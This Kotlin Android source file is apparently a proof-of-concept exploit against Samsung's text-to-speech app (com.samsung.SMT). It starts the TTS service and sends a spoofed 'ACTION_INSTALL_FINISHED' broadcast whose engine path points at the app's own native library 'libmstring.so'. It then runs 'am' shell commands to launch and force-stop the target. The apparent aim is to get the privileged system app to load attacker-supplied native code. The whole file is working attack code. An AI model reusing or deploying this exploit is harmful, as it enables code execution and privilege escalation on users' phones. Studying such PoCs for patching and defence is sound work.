package com.samsung.SMT.lang.poc

import android.content.ComponentName
import android.content.Intent
import android.content.res.AssetManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        copyAssetFolder(assets, "files", "/sdcard/Download/")
        server()
    }

    private fun server() {
        Log.e("oakieserver", "so path " + (applicationInfo.nativeLibraryDir + "/libmstring.so"))

        try {
            Thread.sleep(1000L)
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }

        val serviceIntent = Intent().apply {
            component = ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService")
        }
        application.startService(serviceIntent)

        val intent = Intent("com.samsung.SMT.ACTION_INSTALL_FINISHED").apply {
            setPackage("com.samsung.SMT")
            putExtra("BROADCAST_CURRENT_LANGUAGE_INFO", ArrayList<Any?>())
            putExtra("SMT_ENGINE_VERSION", 361904052)
            putExtra("SMT_ENGINE_PATH", application.applicationInfo.nativeLibraryDir + "/libmstring.so")
        }
        application.sendOrderedBroadcast(intent, null)

        val process = Runtime.getRuntime().exec("am start -n com.samsung.SMT/.gui.DownloadList")
        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val buffer = CharArray(4096)
        val output4 = StringBuffer()

        while (true) {
            val read = reader.read(buffer)

            if (read <= 0) break

            output4.append(buffer, 0, read)
        }

        reader.close()
        process.waitFor()

        val process2 = Runtime.getRuntime().exec("am force-stop com.samsung.SMT 2>&1")
        val reader2 = BufferedReader(InputStreamReader(process2.inputStream))
        val buffer2 = CharArray(4096)
        val output5 = StringBuffer()

        while (true) {
            val read2 = reader2.read(buffer2)

            if (read2 > 0) {
                output5.append(buffer2, 0, read2)
            } else {
                reader2.close()
                process2.waitFor()

                return
            }
        }
    }

    private companion object {
        private fun copyAssetFolder(assetManager: AssetManager, fromAssetPath: String, toPath: String): Boolean {
            return try {
                val files = assetManager.list(fromAssetPath)

                File(toPath).mkdirs()

                var res = true

                for (file in files!!) {
                    res = if (file.contains(".")) {
                        res and copyAsset(assetManager, "$fromAssetPath/$file", "$toPath/$file")
                    } else {
                        res and copyAssetFolder(assetManager, "$fromAssetPath/$file", "$toPath/$file")
                    }
                }

                res
            } catch (e: Exception) {
                e.printStackTrace()

                false
            }
        }

        private fun copyAsset(assetManager: AssetManager, fromAssetPath: String, toPath: String): Boolean = try {
            assetManager.open(fromAssetPath).copyTo(File(toPath).outputStream())

            true
        } catch (e: Exception) {
            e.printStackTrace()

            false
        }
    }
}
